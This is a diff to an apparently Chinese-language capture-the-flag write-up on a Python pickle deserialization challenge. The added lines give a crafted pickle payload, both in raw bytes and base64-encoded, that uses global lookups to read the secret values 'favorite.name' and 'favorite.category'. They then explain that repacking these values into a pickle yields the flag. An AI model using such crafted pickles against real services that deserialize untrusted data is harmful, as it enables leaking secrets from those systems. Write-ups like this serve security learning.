@@ -11,5 +11,10 @@
 
 经过一番尝试，我得到了如下可用的pickle：
 ```
+b'\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03cfavorite\nname\nq\x04X\x08\x00\x00\x00categoryq\x05cfavorite\ncategory\nq\x06ub.'
 ```
-经过base64加密之后，提交，得到了name，使用类似的方法也可以的到category。于是将这两个字符串打包成animal，提交得到flag。
+经过base64加密之后，得到：
+```
+gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA2NmYXZvcml0ZQpuYW1lCnEEWAgAAABjYXRlZ29yeXEFY2Zhdm9yaXRlCmNhdGVnb3J5CnEGdWIu
+```
+提交，得到了name和category。将这两个字符串使用Python打包成animal的pickle，加密为base64，提交即可得到flag。
